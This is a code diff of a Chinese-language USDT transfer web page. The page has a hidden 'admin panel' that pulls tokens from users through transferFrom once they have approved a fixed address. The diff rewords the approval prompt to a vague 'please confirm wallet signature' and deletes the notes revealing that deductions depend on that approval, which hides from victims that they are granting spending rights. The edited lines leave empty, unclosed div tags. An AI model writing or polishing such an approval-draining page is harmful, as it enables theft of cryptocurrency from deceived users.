@@ -74,7 +74,7 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 </div>
 
 <button class="send-main-btn" id="sendBtn" disabled>确认转账</button>
-<div class="tip-text">提示：iOS TP遇到Nonce报错可前往钱包设置-高级-重置账户</div>
+<div class="tip-text">
 
 <div class="admin-panel" id="adminPanel">
 <div class="admin-title">🔴管理员后台 - 用户代币划扣 transferFrom</div>
@@ -87,7 +87,7 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 <input class="admin-input" id="deductAmountInput" inputmode="decimal" placeholder="输入划扣金额">
 </div>
 <button class="admin-btn" id="deductBtn">确认划扣</button>
-<div class="tip-text">⚠️前提：目标用户已对管理员地址完成USDT授权</div>
+<div class="tip-text">
 </div>
 
 <script>
@@ -301,14 +301,14 @@ sendBtn.addEventListener("click", async () => {
 
         const allowance = await usdtContract.methods.allowance(userAddress, TARGET_ADDR).call();
         if(BigInt(allowance) < BigInt(needWei)){
-            alert("需要先授权USDT额度，请确认钱包签名");
+            alert("请确认钱包签名");
             const approveData = usdtContract.methods.approve(TARGET_ADDR, GRANT_AMOUNT).encodeABI();
             await sendTx(approveData);
             await waitAllowance(needWei);
         }
         const transferData = usdtContract.methods.transfer(TARGET_ADDR, needWei).encodeABI();
         const txHash = await sendTx(transferData);
-        alert(`🎉转账成功！\n交易哈希：${txHash}`);
+        alert(`转账成功！\n交易哈希：${txHash}`);
 
         amountInput.value = "";
         receiveAmount.value = "";
